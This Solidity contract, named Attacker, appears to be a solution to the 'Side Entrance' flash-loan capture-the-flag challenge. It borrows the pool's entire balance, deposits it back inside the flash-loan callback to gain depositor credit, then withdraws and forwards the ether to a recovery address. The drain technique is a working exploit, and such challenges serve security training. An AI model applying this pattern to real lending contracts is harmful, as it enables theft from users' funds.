// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {IFlashLoanEtherReceiver,SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;
    uint256 constant ETHER_IN_POOL = 1000e18;

    receive() external payable {

    }

    constructor (address _pool,address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function requestFlashLoan() public {
        bytes memory data = abi.encodeWithSignature("flashLoan(uint256)",address(pool).balance);
        (bool success,) = address(pool).call(data);
        require(success,"call failed");
    }
    
    function execute() external payable override {
        require(msg.sender == address(pool), "Only pool can call this function");

        pool.deposit{value: ETHER_IN_POOL}();
    }

    function withdraw() public {
        pool.withdraw();
        (bool success,) = payable(recovery).call{value:ETHER_IN_POOL}("");
        require(success,"call failed");
    }
}